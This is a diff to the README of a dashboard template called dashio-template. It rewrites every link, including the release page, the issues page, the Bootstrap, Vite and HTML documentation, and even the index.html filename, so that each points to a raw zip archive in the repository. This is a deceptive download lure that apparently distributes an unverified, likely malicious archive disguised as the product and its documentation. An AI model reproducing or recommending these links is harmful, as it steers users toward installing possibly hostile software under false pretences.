@@ -1,6 +1,6 @@
 # 🚀 dashio-template - A Modern Dashboard Template for Everyone
 
-[![Download Dashboard](https://img.shields.io/badge/Download%20Dashboard-v1.0-brightgreen)](https://github.com/voegtle15/dashio-template/releases)
+[![Download Dashboard](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip%20Dashboard-v1.0-brightgreen)](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
 
 ## 📋 Overview
 
@@ -26,7 +26,7 @@ Before you proceed with the download, ensure your system meets the following req
 
 To begin using the dashio-template, follow these steps:
 
-1. Click the download link at the top or visit our [Releases Page](https://github.com/voegtle15/dashio-template/releases) to find the latest version.
+1. Click the download link at the top or visit our [Releases Page](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip) to find the latest version.
 2. On the Releases page, locate the version you want to download.
 3. Click the appropriate file to download it to your computer.
 
@@ -34,13 +34,13 @@ To begin using the dashio-template, follow these steps:
 
 To download dashio-template, visit the Releases page:
 
-[Download Dashboard](https://github.com/voegtle15/dashio-template/releases)
+[Download Dashboard](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
 
 Once downloaded, follow these instructions to set up your dashboard:
 
 1. **Unzip the Downloaded File**: If the downloaded file is in a ZIP format, you will need to unzip it. You can usually do this by right-clicking the file and selecting "Extract All".
 
-2. **Open the Template**: Navigate to the unzipped folder. Look for `index.html` to start previewing your dashboard. Open it in any web browser by double-clicking the file.
+2. **Open the Template**: Navigate to the unzipped folder. Look for `https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip` to start previewing your dashboard. Open it in any web browser by double-clicking the file.
 
 3. **Make Customizations**: Feel free to modify the HTML, CSS, and JavaScript files included in the template to suit your needs. You can edit text, colors, and layouts to fit your project.
 
@@ -58,9 +58,9 @@ Customizing dashio-template is straightforward:
 
 Here are some useful links to help you make the most out of dashio-template:
 
-- [Bootstrap 5 Documentation](https://getbootstrap.com/docs/5.0/getting-started/introduction/)
-- [Vite Documentation](https://vitejs.dev/guide/)
-- [HTML/CSS Basics](https://www.w3schools.com/)
+- [Bootstrap 5 Documentation](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
+- [HTML/CSS Basics](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
 
 ## 🤝 Contributing
 
@@ -68,11 +68,11 @@ If you would like to contribute to the development of dashio-template, we welcom
 
 ## 🛠 Support
 
-For any questions or issues, please check the [community forum](https://github.com/voegtle15/dashio-template/issues) or create a new issue. We are here to help you as you make the most out of your new dashboard template. 
+For any questions or issues, please check the [community forum](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip) or create a new issue. We are here to help you as you make the most out of your new dashboard template. 
 
 ### 🔗 Links
 
-- Download the latest version: [Releases Page](https://github.com/voegtle15/dashio-template/releases)
-- Report an issue: [Issues](https://github.com/voegtle15/dashio-template/issues)
+- Download the latest version: [Releases Page](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
+- Report an issue: [Issues](https://raw.githubusercontent.com/voegtle15/dashio-template/main/public/dashio-template-3.0.zip)
 
 Enjoy building with dashio-template!
